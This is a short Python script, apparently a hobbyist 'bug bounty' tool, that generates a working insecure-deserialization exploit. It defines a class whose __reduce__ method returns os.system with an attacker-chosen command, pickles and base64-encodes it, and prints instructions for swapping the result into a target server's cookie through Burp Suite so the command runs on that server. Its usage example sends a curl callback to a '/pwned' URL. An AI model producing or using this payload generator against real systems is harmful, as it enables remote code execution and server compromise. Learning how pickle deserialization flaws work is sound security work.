import pickle
import base64
import os
import sys

def generate_pickle_payload(command):
    print(f"\n[*] Bhai, starting The Puppet Master: Insecure Deserialization Generator...")
    print(f"[*] Crafting malicious Python Pickle payload for command: '{command}'\n")
    print("==================================================")

    # The Hacker's Malicious Object
    # Python's __reduce__ magic method is called exactly when the object is unpickled (deserialized).
    class PuppetMaster(object):
        def __reduce__(self):
            # This tells the server's unpickler to execute os.system(command)
            return (os.system, (command,))

    # 1. Serialize the malicious object into byte data
    pickled_data = pickle.dumps(PuppetMaster())
    
    # 2. Encode to Base64 so it can be easily sent via HTTP Cookies, Headers, or JSON
    b64_payload = base64.urlsafe_b64encode(pickled_data).decode('utf-8')

    print(f"   [!!!] JACKPOT 🎯 MALICIOUS PAYLOAD GENERATED!")
    print(f"   [!!!] Attack Type: Python Pickle Deserialization (RCE)")
    print(f"   [!!!] Inject this Base64 string into the target's vulnerable cookie or parameter:\n")
    
    # Print the final payload ready to be copied
    print(f"{b64_payload}\n")
    
    print("==================================================")
    print("[+] How to use in Bug Bounty:")
    print("    1. Intercept the HTTP Request using Burp Suite.")
    print("    2. If you see a Base64 cookie that decodes to gibberish containing periods (.), it might be a Pickle object.")
    print("    3. Replace their cookie with your generated string above.")
    print("    4. When the server reads it, your command will execute! 💀💸")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 deserial_puppet.py '<OS_Command>'")
        print("Example: python3 deserial_puppet.py 'curl http://127.0.0.1:8000/pwned'")
        sys.exit(1)
        
    cmd = sys.argv[1]
    generate_pickle_payload(cmd)
